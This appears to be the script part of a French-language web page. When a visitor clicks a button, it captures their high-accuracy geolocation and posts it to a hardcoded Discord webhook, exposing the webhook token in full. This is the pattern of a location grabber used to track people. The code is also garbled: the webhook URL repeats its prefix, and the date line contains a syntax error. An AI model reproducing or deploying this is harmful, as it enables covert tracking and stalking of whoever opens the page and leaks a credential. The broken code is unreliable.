// ============================================
// CONFIGURATION - REMPLIS TON WEBHOOK DISCORD
// ============================================
const WEBHOOK_URL = 'https://discord.com/api/webhooks/https://discord.com/api/webhooks/1406240291165306890/P5l9BtCvKrjGuX4lB3qFIjYWrEsCgrxVx3y1zyKJvUDkfcFgpW5BpFh2P19Xi1x_3vgX';

// ============================================
// GESTION DE LA LOCALISATION
// ============================================
const locateBtn = document.getElementById('locateBtn');
const statusEl = document.getElementById('status');

locateBtn.addEventListener('click', () => {
    if (!navigator.geolocation) {
        setStatus('❌ La géolocalisation n\'est pas supportée par votre navigateur.', 'error');
        return;
    }

    setStatus('⏳ Localisation en cours...', 'loading');
    locateBtn.disabled = true;

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const altitude = position.coords.altitude;
            const speed = position.coords.speed;

            setStatus('✅ Localisation obtenue ! Envoi en cours...', 'success');

            // Construire le embed Discord
            const embedData = {
                embeds: [
                    {
                        title: '📍 Nouvelle Localisation',
                        color: 0xe94560,
                        fields: [
                            {
                                name: '🌐 Latitude',
                                value: `${lat}`,
                                inline: true
                            },
                            {
                                name: '🧭 Longitude',
                                value: `${lon}`,
                                inline: true
                            },
                            {
                                name: '📏 Précision',
                                value: `${Math.round(accuracy)} mètres`,
                                inline: true
                            },
                            {
                                name: '⛰️ Altitude',
                                value: altitude !== null ? `${altitude} m` : 'Non disponible',
                                inline: true
                            },
                            {
                                name: '🏎️ Vitesse',
                                value: speed !== null ? `${speed} m/s` : 'Non disponible',
                                inline: true
                            },
                            {
                                name: '📅 Date/Heure',
                                value: new Date().toLocaleString('fr`fr-FR'))
                            },
                            {
                                name: '🔗 IP Approx.',
                                value: 'Via le navigateur',
                                inline: true
                            }
                        ],
                        footer: {
                            text: 'Géolocalisation via navigateur'
                        },
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embedData)
            })
            .then(res => {
                if (res.ok) {
                    setStatus('✅ Position envoyée au webhook !', 'success');
                } else {
                    setStatus('❌ Erreur lors de l\'envoi.', 'error');
                }
            })
            .catch(err => {
                setStatus('❌ Erreur réseau : ' + err.message, 'error');
            })
            .finally(() => {
                locateBtn.disabled = false;
            });
        },
        (error) => {
            locateBtn.disabled = false;
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    setStatus('❌ Accès refusé. Autorise la géolocalisation.', 'error');
                    break;
                case error.POSITION_UNAVAILABLE:
                    setStatus('❌ Position indisponible.', 'error');
                    break;
                case error.TIMEOUT:
                    setStatus('❌ Timeout. Réessaie.', 'error');
                    break;
                default:
                    setStatus('❌ Erreur inconnue.', 'error');
            }
        },
        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
});

function setStatus(message, type) {
    statusEl.textContent = message;
    statusEl.className = 'status ' + type;
}
</script>
</body>
</html>
